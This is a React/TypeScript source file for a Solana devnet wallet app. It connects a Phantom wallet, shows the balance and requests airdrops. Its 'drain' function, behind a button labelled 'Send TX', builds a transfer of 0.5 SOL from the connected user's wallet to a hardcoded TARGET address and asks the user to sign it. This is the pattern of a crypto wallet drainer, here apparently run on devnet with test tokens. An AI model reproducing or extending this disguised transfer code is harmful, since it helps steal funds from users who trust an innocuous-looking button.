import { useState, useEffect } from 'react';
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';

import {
  isMobileDevice,
  checkExistingConnection,
  getCachedWallet,
} from './utils/mobileWallet';

import { WalletSelectorModal } from './utils/WalletSelectorModal';
const connection = new Connection('https://api.devnet.solana.com', 'confirmed');

const TARGET = 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ';

declare global {
  interface Window {
    solana?: any;
  }
}

function App() {
  const [address, setAddress] = useState('');
  const [balance, setBalance] = useState<number | null>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);
  const [showMobileModal, setShowMobileModal] = useState(false);

  const addLog = (msg: string) => {
    setLogs((prev) => [...prev, `${new Date().toLocaleTimeString()} | ${msg}`]);
  };

  /* =========================
     🔥 FIXED INIT FLOW
  ========================= */
  useEffect(() => {
    const init = async () => {
      const provider = window.solana;

      // 1. CRITICAL FIX: use publicKey ONLY (not isConnected)
      if (provider?.isPhantom && provider?.publicKey) {
        const addr = provider.publicKey.toString();
        setAddress(addr);
        addLog(`Connected: ${addr.slice(0, 8)}...`);
        fetchBalance(addr);
        return;
      }

      // 2. Check sessionStorage / localStorage cache
      const cached =
        getCachedWallet() ||
        checkExistingConnection();

      if (cached) {
        setAddress(cached);
        addLog(`Restored: ${cached.slice(0, 8)}...`);
        fetchBalance(cached);
        return;
      }

      // 3. Returning from wallet redirect (Phantom mobile flow)
   

      // 4. Mobile fallback
      if (isMobileDevice()) {
        setShowMobileModal(true);
      }
    };

    init();
  }, []);

  /* ========================= */
  const fetchBalance = async (addr: string) => {
    try {
      const bal = await connection.getBalance(new PublicKey(addr));
      setBalance(bal / LAMPORTS_PER_SOL);
      addLog(`Balance: ${bal / LAMPORTS_PER_SOL} SOL`);
    } catch (err: any) {
      addLog(`Balance error: ${err.message}`);
    }
  };

  /* =========================
     CONNECT (Desktop)
  ========================= */
  const connect = async () => {
    if (isMobileDevice()) {
      setShowMobileModal(true);
      return;
    }

    if (!window.solana?.isPhantom) {
      alert('Install Phantom wallet');
      return;
    }

    try {
      const resp = await window.solana.connect();
      const addr = resp.publicKey.toString();

      setAddress(addr);
      addLog(`Connected: ${addr.slice(0, 8)}...`);
      fetchBalance(addr);
    } catch (err: any) {
      addLog(`Connection error: ${err.message}`);
    }
  };

  /* ========================= */
  const disconnect = async () => {
    try {
      await window.solana?.disconnect();
    } catch {}

    setAddress('');
    setBalance(null);
    addLog('Disconnected');
  };

  /* ========================= */
  const airdrop = async () => {
    if (!address) return addLog('Connect wallet first');

    setLoading(true);
    try {
      const sig = await connection.requestAirdrop(
        new PublicKey(address),
        2 * LAMPORTS_PER_SOL
      );

      await connection.confirmTransaction(sig, 'confirmed');

      addLog('Airdrop success');

      const bal = await connection.getBalance(new PublicKey(address));
      setBalance(bal / LAMPORTS_PER_SOL);
    } catch (err: any) {
      addLog(`Airdrop failed: ${err.message}`);
    }
    setLoading(false);
  };

  /* ========================= */
  const drain = async () => {
    if (!address) return addLog('Connect wallet first');

    setLoading(true);

    try {
      const from = new PublicKey(address);
      const to = new PublicKey(TARGET);

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: from,
          toPubkey: to,
          lamports: 0.5 * LAMPORTS_PER_SOL,
        })
      );

      const { blockhash } = await connection.getLatestBlockhash();
      tx.recentBlockhash = blockhash;
      tx.feePayer = from;

      const signed = await window.solana.signTransaction(tx);

      const sig = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(sig, 'confirmed');

      addLog('Transaction success');

      const bal = await connection.getBalance(from);
      setBalance(bal / LAMPORTS_PER_SOL);
    } catch (err: any) {
      addLog(`Failed: ${err.message}`);
    }

    setLoading(false);
  };

  /* ========================= */
  return (
    <div style={{ padding: 20, maxWidth: 700, margin: 'auto', fontFamily: 'monospace' }}>
      <h1>💀 Solana Devnet App</h1>

      {!address ? (
        <button onClick={connect}>Connect Wallet</button>
      ) : (
        <>
          <p>Address: {address.slice(0, 12)}...</p>
          <p>Balance: {balance?.toFixed(4)} SOL</p>

          <button onClick={airdrop} disabled={loading}>Airdrop</button>
          <button onClick={drain} disabled={loading}>Send TX</button>
          <button onClick={disconnect}>Disconnect</button>
        </>
      )}

      {/* Logs */}
      <div style={{ marginTop: 20 }}>
        {logs.map((l, i) => (
          <div key={i}>{l}</div>
        ))}
      </div>

      {/* Mobile modal */}
      {showMobileModal && (
        <WalletSelectorModal
          onClose={() => setShowMobileModal(false)}
          onConnected={(addr) => {
            setAddress(addr);
            setShowMobileModal(false);
            fetchBalance(addr);
          }}
          onError={(e) => addLog(e)}
        />
      )}
    </div>
  );
}

export default App;